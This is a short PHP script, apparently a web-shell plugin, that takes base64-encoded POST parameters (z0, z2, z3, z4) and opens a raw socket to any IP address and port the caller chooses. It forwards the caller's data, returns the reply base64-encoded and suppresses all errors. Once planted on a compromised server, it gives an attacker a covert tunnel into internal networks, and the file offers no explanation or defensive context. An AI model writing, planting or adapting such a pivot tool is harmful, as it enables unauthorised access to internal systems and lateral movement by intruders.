<?php

@error_reporting(0);
@set_time_limit(10);

function main($action, $target_ip, $target_port, $data)
{
    if ($action == 'forward') {
        $socket = @fsockopen($target_ip, $target_port, $errno, $errstr, 3);
        
        if (!$socket) {
            echo(json_encode(['status' => 'error', 'msg' => 'Connect failed']));
            return;
        }

        @stream_set_blocking($socket, false);
        
        if (!empty($data)) {
            @fwrite($socket, $data);
        }

        $response = "";
        $retry = 0;
        
        while ($retry < 3) {
            usleep(50000);
            $has_data = false;
            while ($chunk = @fread($socket, 8192)) {
                $response .= $chunk;
                $has_data = true;
            }
            
            if ($has_data && strlen($response) > 0) {
                break;
            }
            $retry++;
        }

        @fclose($socket);

        echo(json_encode([
            'status' => 'success',
            'data' => base64_encode($response)
        ]));
    }
}

$action = base64_decode($_POST['z0']);
$target_ip = base64_decode($_POST['z2']);
$target_port = base64_decode($_POST['z3']);
$data = base64_decode($_POST['z4']);
$data = base64_decode($data); //buffer

main($action, $target_ip, $target_port, $data);

?>